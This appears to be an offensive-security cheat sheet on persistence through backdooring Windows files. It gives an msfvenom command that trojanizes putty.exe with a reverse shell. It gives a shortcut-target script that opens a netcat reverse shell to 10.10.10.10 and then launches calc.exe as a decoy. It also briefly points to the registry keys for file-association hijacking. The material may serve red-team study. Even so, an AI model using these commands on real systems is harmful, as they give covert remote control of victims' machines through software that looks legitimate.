# Backdooring Files
We can tamper with files we know the user interacts with regularly.

## Executable Files
you can plant a payload in any exe file using `msvenom`. This will execute an extra thread in your binary while still retaining all functionality.

```sh
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.10.10.10 lport=4444 -b "\x00" -f exe -o puttyX.exe
```

## Shortcut Files
We can point a shortcut to a script we control. Lets create an example script
```sh
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.10.10 4445"
C:\Windows\System32\calc.exe
```

## HiJacking File Associations
Default operating system file associations are kept inside the registry. A key is stored for every single file type under:

```sh
HKLM\Software\Classes\.txt
```
[text file](txt.png)

